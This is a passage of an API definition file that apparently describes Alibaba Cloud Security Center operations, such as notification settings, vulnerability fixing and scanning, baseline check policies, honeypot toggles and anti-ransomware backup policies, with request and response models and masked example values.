  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyLoginSwitchConfigResponseBody(name='body'),
}

async function modifyLoginSwitchConfig(request: ModifyLoginSwitchConfigRequest): ModifyLoginSwitchConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyLoginSwitchConfig', 'POST', '/', 'json', false, 'json', request);
}

model ModifyNoticeConfigRequest {
  project?: string(name='Project', description='The identifier of the notification item. Valid values:

*   **yundun\\_security_Weekreport**: notification for vulnerabilities
*   **yundun\\_sas\\_antiransomware_task**: notification for results of restoration tasks
*   **sas_healthcheck**: notification for baseline checks
*   **sas_suspicious**: notification for alerts generated by Security Center
*   **yundun\\_aegis\\_AV_true**: notification for precision defense
*   **yundun\\_sas\\_ak_leakage**: notification for AccessKey pair leaks
*   **yundun\\_sas\\_config_alert**: notification for configuration assessment
*   **yundun\\_sas\\_vul_Emergency**: notification for urgent vulnerabilities
*   **yundun\\_webguard_event**: notification for web tamper proofing
*   **yundun\\_sas\\_cloud\\_native_firewall**: notification for alerts generated by the container firewall feature
*   **yundun\\_sas\\_cloud\\_native\\_firewall_Defense**: notification for proactive defense implemented by the container firewall feature
*   **yundun\\_IP_Blocking**: notification for blocked brute-force attacks initiated from malicious IP addresses
*   **yundun\\_sas\\_anti\\_virus_config**: notification for virus scan
*   **yundun\\_sas_log**: notification for excess logs
*   **yundun\\_honeypot_alarm**: notification for alerts generated by the honeypot feature
*   **aliyun\\_rasp_alarm**: notification for alerts generated by the application security feature
*   **virusScheduleTask**: notification for completion of scheduled virus scans
*   **yundun\\_anti_Virus**: notification that no security checks are performed
*   **sas_vulnerability**: notification for vulnerabilities
*   **weeklyreport**: notification for weekly reports
*   **agent**: notification that the Security Center agent is offline
*   **bruteforcesuccess**: notification for protection against brute-force attacks
*   **webshell**: notification for webshells
*   **suspicious**: notification for alerts generated by Server Guard
*   **patch**: deprecated
*   **remotelogin**: notification for remote logons
*   **health**: notification for security checks
*   **yundun\\_sas\\_cloudsiem_log**: notifications of insufficient threat analysis log capacity

> If the value is **yundun\\_security_Weekreport**, weekly reports are sent to notify you of unhandled vulnerabilities.', example='yundun_webguard_event', position='Query'),
  route?: int32(name='Route', description='The notification method. Valid values:

*   **1**: text message
*   **2**: email
*   **4**: internal message
*   **3**: text message and email
*   **5**: text message and internal message
*   **6**: email and internal message
*   **7**: text message, email, and internal message', example='4', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='42.178.XX.XX', position='Query'),
  timeLimit?: int32(name='TimeLimit', description='The time period during which Security Center sends notifications. Valid values:

*   **0**: any time
*   **1**: 08:00 to 22:00', example='1', position='Query'),
}

model ModifyNoticeConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5989D067-621F-51E2-A636-D94D1388****'),
}

model ModifyNoticeConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyNoticeConfigResponseBody(name='body'),
}

async function modifyNoticeConfig(request: ModifyNoticeConfigRequest): ModifyNoticeConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyNoticeConfig', 'POST', '/', 'json', false, 'json', request);
}

model ModifyOpenLogShipperRequest {
  from?: string(name='From', description='The ID of the request source. Default value: **aegis**. Valid values:

*   **aegis**: Server Guard
*   **sas**: Security Center

>  If you use Server Guard, set the value to **aegis**. If you use Security Center, set the value to **sas**.', example='sas', position='Query'),
}

model ModifyOpenLogShipperResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='25EC270F-5783-4416-AD7C-1EDF063A039C'),
}

model ModifyOpenLogShipperResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyOpenLogShipperResponseBody(name='body'),
}

/**
  * **Prerequisites** [Simple Log Service](https://www.alibabacloud.com/help/en/log-service/latest/billable-items) is activated. A service-linked role for Security Center is created, and Security Center is authorized to access cloud resources. You can call the [CreateServiceLinkedRole](~~CreateServiceLinkedRole~~) operation to create a service-linked role for Security Center and authorize Security Center to access cloud resources. **Scenarios** Before you use the log analysis feature of Security Center, you must call the [ModifyOpenLogShipper](~~ModifyOpenLogShipper~~) operation to activate Simple Log Service.
  *
 */
async function modifyOpenLogShipper(request: ModifyOpenLogShipperRequest): ModifyOpenLogShipperResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyOpenLogShipper', 'POST', '/', 'json', false, 'json', request);
}

model ModifyOperateVulRequest {
  from?: string(name='From', description='The request ID. Set the value to **sas**.', example='sas', position='Query'),
  info: string(name='Info', description='The details of the vulnerability. The value of this parameter is in the JSON format and contains the following fields:

*   **name**: the name of the vulnerability.

*   **uuid**: the UUID of the server on which the vulnerability is detected.

*   **tag**: the tag that is added to the vulnerability. Valid values:

    *   **oval**: Linux software vulnerability
    *   **system**: Windows system vulnerability
    *   **cms**: Web-CMS vulnerability

>  You can call the [DescribeVulList](~~DescribeVulList~~) operation to query the tags that are added to vulnerabilities of other types.

*   **isFront**: specifies whether a pre-patch is required to fix the Windows system vulnerability. This field is required only for Windows system vulnerabilities. Valid values:

    *   **0**: no
    *   **1**: yes

>  You can fix multiple vulnerabilities at a time. Separate the details of multiple vulnerabilities with commas (,). You can call the [DescribeVulLIst](~~DescribeVulList~~) operation to query the details of vulnerabilities.', example='[{"name":"alilinux2:2.1903:ALINUX2-SA-2022:0007","uuid":"a3bb82a8-a3bd-4546-acce-45ac34af****","tag":"oval","isFront":0},{"name":"alilinux2:2.1903:ALINUX2-SA-2022:0007","uuid":"98a6fecc-88cd-46f2-8e35-f808a388****","tag":"oval","isFront":0}]', position='Query'),
  operateType: string(name='OperateType', description='The operation that you want to perform on the vulnerability. Valid values:

*   **vul_fix**: fixes the vulnerability.
*   **vul_verify**: verifies the vulnerability fix.
*   **vul_ignore**: ignores the vulnerability.
*   **vul\\_undo_ignore**: cancels ignoring the vulnerability.
*   **vul_delete**: deletes the vulnerability.', example='vul_fix', position='Query'),
  reason?: string(name='Reason', description='The reason why the vulnerability is **ignored**.

>  This parameter is required only when you set **OperateType** to **vul_ignore**.', example='not operate', position='Query'),
  type: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **emg**: urgent vulnerability
*   **app**: application vulnerability
*   **sca**: vulnerability that is detected based on software component analysis

>  You cannot fix the urgent vulnerabilities, application vulnerabilities, or vulnerabilities that are detected based on software component analysis.', example='cve', position='Query'),
}

model ModifyOperateVulResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='DFE4F166-1AC9-4FAC-A4E4-F0608AD705A6'),
}

model ModifyOperateVulResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyOperateVulResponseBody(name='body'),
}

async function modifyOperateVul(request: ModifyOperateVulRequest): ModifyOperateVulResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyOperateVul', 'POST', '/', 'json', false, 'json', request);
}

model ModifyPropertyScheduleConfigRequest {
  scheduleTime: string(name='ScheduleTime', example='3', position='Query'),
  type: string(name='Type', example='scheduler_port_period', position='Query'),
}

model ModifyPropertyScheduleConfigResponseBody = {
  modifyResult?: boolean(name='ModifyResult', example='true'),
  requestId?: string(name='RequestId', example='C0D1DF51-D879-55A8-B6C7-7D3B913EF34D'),
}

model ModifyPropertyScheduleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyPropertyScheduleConfigResponseBody(name='body'),
}

async function modifyPropertyScheduleConfig(request: ModifyPropertyScheduleConfigRequest): ModifyPropertyScheduleConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyPropertyScheduleConfig', 'POST', '/', 'json', false, 'json', request);
}

model ModifyPushAllTaskRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX', position='Query'),
  tasks: string(name='Tasks', description='The check items. Separate multiple check items with commas (,). Valid values:

*   **OVAL_ENTITY**: Common Vulnerabilities and Exposures (CVE) vulnerabilities
*   **CMS**: Web-CMS vulnerabilities
*   **SYSVUL**: Windows system vulnerabilities
*   **SCA**: application vulnerabilities
*   **HEALTH_CHECK**: baselines
*   **WEBSHELL**: webshells
*   **PROC_SNAPSHOT**: processes
*   **PORT_SNAPSHOT**: ports
*   **ACCOUNT_SNAPSHOT**: accounts
*   **SOFTWARE_SNAPSHOT**: software assets
*   **SCA_SNAPSHOT**: middleware', example='HEALTH_CHECK,OVAL_ENTITY', position='Query'),
  uuids: string(name='Uuids', description='The UUIDs of servers on which you want to perform security check tasks. Separate multiple UUIDs with commas (,).', example='inet-923b4538-0e88-409d-80ba-cb2e7487****,dc1691eb-656f-472f-b2aa-04f621f4****,70452f92-9fc1-45c5-ab35-e7bf8552****', position='Query'),
}

model ModifyPushAllTaskResponseBody = {
  pushTaskRsp?: {
    pushTaskResultList?: [ 
      {
        groupId?: long(name='GroupId', description='The ID of the server group to which the server belongs.', example='226'),
        instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-wz9f7wlklxqnvdk****'),
        instanceName?: string(name='InstanceName', description='The name of the server.', example='TestInstance'),
        ip?: string(name='Ip', description='The IP address of the server.', example='127.XX.XX'),
        message?: string(name='Message', description='The message that describes the security check failure.', example='successful'),
        online?: boolean(name='Online', description='Indicates whether the Security Center agent is online. Valid values:

*   **true**: yes
*   **false**: no

>  If the Security Center agent of the server is offline, Security Center does not protect the server.', example='false'),
        osVersion?: string(name='OsVersion', description='The operating system version of the server.', example='linux'),
        region?: string(name='Region', description='The region in which the server resides.', example='cn-beijing'),
        success?: boolean(name='Success', description='Indicates whether the security check task is successful. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
        uuid?: string(name='Uuid', description='The UUID of the server.', example='5493fe42-61f5-4627-9aa2-8c449bbe****'),
      }
    ](name='PushTaskResultList', description='An array consisting of the servers on which security check tasks failed.'),
  }(name='PushTaskRsp', description='The results of security check tasks.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='91EB4AC7-7FEF-4C72-BE49-4414E459AEC2'),
}

model ModifyPushAllTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyPushAllTaskResponseBody(name='body'),
}

async function modifyPushAllTask(request: ModifyPushAllTaskRequest): ModifyPushAllTaskResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyPushAllTask', 'POST', '/', 'json', false, 'json', request);
}

model ModifyRefreshProcessInfoRequest {
  uuid?: string(name='Uuid', description='The UUID of the server.

> You can call the [DescribeCloudCenterInstances](~~141932~~) operation to query the UUIDs of servers.', example='0f3b8f76-90e5-4455-a5aa-23ce30b5****', position='Query'),
}

model ModifyRefreshProcessInfoResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='814FCBBC-3A02-5555-8D05-F8D9FD62A295'),
}

model ModifyRefreshProcessInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyRefreshProcessInfoResponseBody(name='body'),
}

async function modifyRefreshProcessInfo(request: ModifyRefreshProcessInfoRequest): ModifyRefreshProcessInfoResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyRefreshProcessInfo', 'POST', '/', 'json', false, 'json', request);
}

model ModifyRiskCheckStatusRequest {
  itemId: long(name='ItemId', description='The ID of the check item.', example='37', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='183.223.XX.XX', position='Query'),
  status: string(name='Status', description='The method to handle the check item. Valid values:

*   **ignored**: ignores the check item
*   **reset**: cancels ignoring the check item', example='ignored', position='Query'),
  taskId: long(name='TaskId', description='The ID of the check task to which the check item belongs.', example='57', position='Query'),
}

model ModifyRiskCheckStatusResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='48D2E9A9-A1B0-4295-B727-0995757C47E9'),
}

model ModifyRiskCheckStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyRiskCheckStatusResponseBody(name='body'),
}

/**
  * @deprecated
  * This operation is phased out. You can use the following operations:
  * \\-To **ignore a check item**, use the AddCheckResultWhiteList operation.
  * \\-To **cancel ignoring a check item**, use the RemoveCheckResultWhiteList operation.
  *
 */
// Deprecated
async function modifyRiskCheckStatus(request: ModifyRiskCheckStatusRequest): ModifyRiskCheckStatusResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyRiskCheckStatus', 'POST', '/', 'json', false, 'json', request);
}

model ModifyRiskSingleResultStatusRequest {
  ids: [ string ](name='Ids', description='The IDs of the affected assets.', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='42.120.XX.XX', position='Query'),
  status: string(name='Status', description='The method to handle the risk item. Valid values:

*   **ignored**: ignores the risk item.
*   **failed**: cancels ignoring the risk item.', example='ignored', position='Query'),
  taskId: long(name='TaskId', description='The ID of the check task to which the affected assets belong.', example='57', position='Query'),
}

model ModifyRiskSingleResultStatusResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3B3F3A90-46A5-4023-A2D8-D68B14262F96'),
}

model ModifyRiskSingleResultStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyRiskSingleResultStatusResponseBody(name='body'),
}

/**
  * @deprecated
  * This operation is phased out. You can use the following operations:
  * \\-To **ignore a risk item**, use the AddCheckInstanceResultWhiteList operation.
  * \\-To **cancel ignoring a risk item**, use the RemoveCheckInstanceResultWhiteList operation.
  *
 */
// Deprecated
async function modifyRiskSingleResultStatus(request: ModifyRiskSingleResultStatusRequest): ModifyRiskSingleResultStatusResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyRiskSingleResultStatus', 'POST', '/', 'json', false, 'json', request);
}

model ModifySecurityCheckScheduleConfigRequest {
  daysOfWeek: string(name='DaysOfWeek', description='The days on which the automatic configuration check runs. You can specify multiple days. Separate multiple days with commas (,). Valid values:

*   **1**: Monday
*   **2**: Tuesday
*   **3**: Wednesday
*   **4**: Thursday
*   **5**: Friday
*   **6**: Saturday
*   **7**: Sunday', example='4,5,6', position='Query'),
  endTime: int32(name='EndTime', description='The time period during which the automatic configuration check ends. Valid values:

*   **0**: 00:00 to 06:00
*   **6**: 06:00 to 12:00
*   **12**: 12:00 to 18:00
*   **18**: 18:00 to 24:00', example='12', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX', position='Query'),
  startTime: int32(name='StartTime', description='The time period during which the automatic configuration check starts. Valid values:

*   **0**: 00:00 to 06:00
*   **6**: 06:00 to 12:00
*   **12**: 12:00 to 18:00
*   **18**: 18:00 to 24:00', example='6', position='Query'),
}

model ModifySecurityCheckScheduleConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='02287C0D-8DA9-5766-B51A-A63192BD3E80'),
}

model ModifySecurityCheckScheduleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifySecurityCheckScheduleConfigResponseBody(name='body'),
}

/**
  * @deprecated
  * This operation is phased out. You can use the ChangeCheckConfig operation.
  *
 */
// Deprecated
async function modifySecurityCheckScheduleConfig(request: ModifySecurityCheckScheduleConfigRequest): ModifySecurityCheckScheduleConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifySecurityCheckScheduleConfig', 'POST', '/', 'json', false, 'json', request);
}

model ModifySecurityEventMarkMissIndividuallyRequest {
  deleteMarkMissParam?: string(name='DeleteMarkMissParam', description='The alert handling rule that you want to delete.', example='[{\\"field\\":\\"loginSourceIp\\",\\"operate\\":\\"contains\\",\\"eventType\\":\\"SIL_AI_ALERT\\",\\"eventName\\":\\"login_common_ip\\",\\"fieldValue\\":\\"10.12.XX.XX\\",\\"uuids\\":\\"\\"}]', position='Body'),
  from?: string(name='From', description='The ID of the request source. Set the value to **sas**.', example='sas', position='Body'),
  insertMarkMissParam?: string(name='InsertMarkMissParam', description='The alert handling that you want to add.', example='[{\\"field\\":\\"location\\",\\"operate\\":\\"contains\\",\\"eventType\\":\\"SIL_AI_ALERT\\",\\"eventName\\":\\"login_common_ip\\",\\"fieldValue\\":\\"xx\\",\\"uuids\\":\\"4296ee47-bf19-4fa4-a4a6-6bxxxxxxxxx\\"}]', position='Body'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Body'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request. You do not need to specify this parameter. It is automatically obtained by the system.', example='127.0.XX.XX', position='Query'),
}

model ModifySecurityEventMarkMissIndividuallyResponseBody = {
  code?: string(name='Code', description='The status code of the alert event.

*   **200**: indicates that the alert event is successfully handled.
*   Other codes: indicates that the alert event fails to be handled.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='A37B852F-E346-5FF2-82BD-D1F1DXXXXXX'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
  timeCost?: long(name='TimeCost', description='The time that was consumed to process the request. Unit: milliseconds.', example='1'),
}

model ModifySecurityEventMarkMissIndividuallyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifySecurityEventMarkMissIndividuallyResponseBody(name='body'),
}

async function modifySecurityEventMarkMissIndividually(request: ModifySecurityEventMarkMissIndividuallyRequest): ModifySecurityEventMarkMissIndividuallyResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifySecurityEventMarkMissIndividually', 'POST', '/', 'json', true, 'form', request);
}

model ModifyStartVulScanRequest {
  types?: string(name='Types', description='The types of vulnerabilities that can be detected. Valid values:

*   **cve**: Linux software vulnerabilities
*   **sys**: Windows system vulnerabilities
*   **cms**: Web-CMS vulnerabilities
*   **app**: application vulnerabilities
*   **emg**: urgent vulnerabilities
*   **image**: container image vulnerabilities
*   **sca**: vulnerabilities that are detected based on software component analysis

> If you leave this parameter empty, all types of vulnerabilities can be detected.', example='"cve,sys,cms,app,emg"', position='Query'),
  uuids?: string(name='Uuids', description='The UUIDs of servers.', example='{"i-sdada-xxxxx","i-ifaedada-sfsasdxxx"}', position='Query'),
}

model ModifyStartVulScanResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='4066CAC3-F83A-4729-9995-A5558A61B546'),
}

model ModifyStartVulScanResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyStartVulScanResponseBody(name='body'),
}

async function modifyStartVulScan(request: ModifyStartVulScanRequest): ModifyStartVulScanResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyStartVulScan', 'POST', '/', 'json', false, 'json', request);
}

model ModifyStrategyRequest {
  customType: string(name='CustomType', description='The type of the baseline check policy. Valid values:

*   **custom**: a custom baseline check policy
*   **common**: a standard baseline check policy', example='common', position='Query'),
  cycleDays: string(name='CycleDays', description='The new interval of the baseline check. Valid values:

*   **1**: every 2 days
*   **3**: every 4 days
*   **7**: every 8 days
*   **30**: every 31 days', example='1', position='Query'),
  cycleStartTime?: string(name='CycleStartTime', description='The new time range during which the baseline check starts. Valid values:

*   **0**: The baseline check starts within the time range from 00:00 to 06:00.
*   **6**: The baseline check starts within the time range from 06:00 to 12:00.
*   **12**: The baseline check starts within the time range from 12:00 to 18:00.
*   **18**: The baseline check starts within the time range from 18:00 to 24:00.

>  This parameter is deprecated.', example='18', position='Query'),
  endTime: string(name='EndTime', description='The time when the baseline check based on the baseline check policy ends. Specify the time in the hh:mm:ss format.', example='05:00:00', position='Query'),
  id?: string(name='Id', description='The ID of the baseline check policy.', example='245', position='Query'),
  name: string(name='Name', description='The new name of the baseline check policy.', example='testStrategy', position='Query'),
  riskCustomParams?: string(name='RiskCustomParams', description='The custom configurations of the baseline. The value of this parameter is in the JSON format and contains the following fields:

*   **typeName**: the name of the baseline.

*   **checkDetails**: the details of the baseline. The value is in the JSON format.

    *   **checkId**: the ID of the check item.

    *   **rules**: the rule configurations. The value is in the JSON format.

        *   **ruleId**: the ID of the rule.

        *   **paramList**: the list of parameters in the rule. The value is in the JSON format.

            *   **paramName**: the name of the parameter.
            *   **value**: the value of the parameter.', example='[{"typeName":"hc_centos_6_custom","checkDetails":[{"checkId":4,"rules":[{"ruleId":"pass_min_days_login_defs.must.cus","paramList":[{"paramName":"range_val","value":"7"}]}]}]}]', position='Query'),
  riskSubTypeName: string(name='RiskSubTypeName', description='The subtype of the baselines. You can call the [DescribeRiskType](~~DescribeRiskType~~) operation to query the subtypes of baselines.', example='hc_exploit_redis', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.X.X', position='Query'),
  startTime: string(name='StartTime', description='The time when the baseline check based on the baseline check policy starts. Specify the time in the hh:mm:ss format.', example='00:01:00', position='Query'),
  targetType: string(name='TargetType', description='The method that is used to apply the baseline check policy. Valid values:

*   **groupId**: asset groups
*   **uuid**: assets', example='groupId', position='Query'),
}

model ModifyStrategyResponseBody = {
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='8EFA2BD9-00CD-5D69-B6B0-4EE83EAF072E'),
  result?: {
    strategyId?: int32(name='StrategyId', description='The ID of the baseline check policy.', example='8164239'),
  }(name='Result', description='The result returned.'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ModifyStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyStrategyResponseBody(name='body'),
}

async function modifyStrategy(request: ModifyStrategyRequest): ModifyStrategyResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyStrategy', 'POST', '/', 'json', false, 'json', request);
}

model ModifyStrategyTargetRequest {
  config: string(name='Config', example='{"strategyId":8070645}', position='Query'),
  sourceIp?: string(name='SourceIp', example='192.168.XX.XX', position='Query'),
  target: string(name='Target', example='[{"Target":"9273980","BindUuidCount":5320,"TargetType":"groupId","Flag":"del"},{"Target":"9677606","TargetType":"groupId","Flag":"del"},{"Target":"10121607","BindUuidCount":7,"TargetType":"groupId","Flag":"add"},{"Target":"10670708","BindUuidCount":2,"TargetType":"groupId","Flag":"del"},{"Target":"11246338","BindUuidCount":6,"TargetType":"groupId","Flag":"del"},{"Target":"11291161","BindUuidCount":13,"TargetType":"groupId","Flag":"del"}]', position='Query'),
  type: string(name='Type', example='hc_strategy', position='Query'),
}

model ModifyStrategyTargetResponseBody = {
  requestId?: string(name='RequestId', example='0E147337-5B0B-5776-B0B6-D569DBA8F60F'),
}

model ModifyStrategyTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyStrategyTargetResponseBody(name='body'),
}

async function modifyStrategyTarget(request: ModifyStrategyTargetRequest): ModifyStrategyTargetResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyStrategyTarget', 'POST', '/', 'json', false, 'json', request);
}

model ModifyTagWithUuidRequest {
  machineTypes?: string(name='MachineTypes', example='ecs', position='Query'),
  tagId?: string(name='TagId', example='3897941', position='Query'),
  tagList: string(name='TagList', example='ac,ad', position='Query'),
  uuidList?: string(name='UuidList', example='e2737dc3-78f4-4653-a986-dc5fad4b****,c189f0e3-df22-42d5-a73d-02c05667****', position='Query'),
}

model ModifyTagWithUuidResponseBody = {
  requestId?: string(name='RequestId', example='70C4B40D-D55E-4B7B-9992-8535E396B2F4'),
}

model ModifyTagWithUuidResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyTagWithUuidResponseBody(name='body'),
}

async function modifyTagWithUuid(request: ModifyTagWithUuidRequest): ModifyTagWithUuidResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyTagWithUuid', 'POST', '/', 'json', false, 'json', request);
}

model ModifyUniBackupPolicyRequest {
  accountName?: string(name='AccountName', description='The name of the database account.', example='sa', position='Query'),
  accountPassword?: string(name='AccountPassword', description='The password of the database account.', example='Sa@****', position='Query'),
  fullPlan?: map[string]any(name='FullPlan', description='The policy for full backup. The value of this parameter is a JSON string that contains the following fields:

*   **start**: the start time of a backup task
*   **interval**: the interval of backup tasks
*   **type**: the unit of the interval
*   **days**: the days of a week on which a backup task is performed', example='{"days":[4],"interval":1,"planType":"weekly","startTime":"22:00:00"}', shrink='json', position='Query'),
  incPlan?: map[string]any(name='IncPlan', description='The policy for incremental backup. The value of this parameter is a JSON string that contains the following fields:

*   **start**: the start time of a backup task
*   **interval**: the interval of backup tasks
*   **type**: the unit of the interval
*   **days**: the days of a week on which a backup task is performed', example='{"interval":1,"planType":"daily","startTime":"23:30:00"}', shrink='json', position='Query'),
  policyId: long(name='PolicyId', description='The ID of the anti-ransomware policy.

> You can call the [DescribeUniBackupPolicies](~~DescribeUniBackupPolicies~~) operation to query the IDs of anti-ransomware policies.', example='123', position='Query'),
  policyName?: string(name='PolicyName', description='The name of the anti-ransomware policy.', example='databak', position='Query'),
  policyStatus?: string(name='PolicyStatus', description='The status of the anti-ransomware policy. Valid values:

*   **enabled**
*   **disabled**', example='enabled', position='Query'),
  retention?: int32(name='Retention', description='The retention period of the backup snapshot.', example='7', position='Query'),
  speedLimiter?: long(name='SpeedLimiter', description='The maximum network bandwidth that is allowed during data backup. Unit: bytes.', example='1048576', position='Query'),
}

model ModifyUniBackupPolicyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3F6FAB39-5AF7-5B2C-A17D-16D52AE0****'),
}

model ModifyUniBackupPolicyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyUniBackupPolicyResponseBody(name='body'),
}

async function modifyUniBackupPolicy(request: ModifyUniBackupPolicyRequest): ModifyUniBackupPolicyResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyUniBackupPolicy', 'POST', '/', 'json', false, 'json', request);
}

model ModifyVpcHoneyPotRequest {
  honeyPotAction: string(name='HoneyPotAction', description='Specifies whether to enable or disable the honeypot. Valid values:

*   **disable**
*   **enable**', example='disable', position='Query'),
  vpcId: string(name='VpcId', description='The ID of the virtual private cloud (VPC) on which the honeypot is deployed.

>  You can call the [DescribeVpcHoneyPotList](~~DescribeVpcHoneyPotList~~) operation to query the IDs of VPCs.', example='vpc-d7o009q63fqy21r8u****', position='Query'),
}

model ModifyVpcHoneyPotResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='8158FE9E-19BE-42D6-9F7A-9BE34A2DE1D5'),
}

model ModifyVpcHoneyPotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyVpcHoneyPotResponseBody(name='body'),
}

async function modifyVpcHoneyPot(request: ModifyVpcHoneyPotRequest): ModifyVpcHoneyPotResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyVpcHoneyPot', 'POST', '/', 'json', false, 'json', request);
}

model ModifyVulConfigRequest {
  config?: string(name='Config', description='Specifies whether to enable the vulnerability scan feature. Valid values:

*   **on**: enables the feature
*   **off**: disables the feature

> Valid values when you set the Type parameter to scanMode:

*   **real**: displays only easily exploitable vulnerabilities.

*   **all**: displays all vulnerabilities.', example='on', position='Query'),
  type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **emg**: urgent vulnerability
*   **app**: application vulnerability
*   **yum**: YUM and APT source configuration
*   **scanMode**: easily exploitable vulnerability', example='cve', position='Query'),
}

model ModifyVulConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='24DDBE06-58FF-5E5E-9241-D2010D7913C1'),
}

model ModifyVulConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyVulConfigResponseBody(name='body'),
}

async function modifyVulConfig(request: ModifyVulConfigRequest): ModifyVulConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyVulConfig', 'POST', '/', 'json', false, 'json', request);
}

model ModifyVulTargetRequest {
  config?: string(name='Config', description='The configurations. The value of this parameter is in the JSON format and contains the following fields:

*   **vulType**: the type of the vulnerabilities to scan. Valid values:

    *   **cve**: Linux software vulnerabilities
    *   **sys**: Windows system vulnerabilities
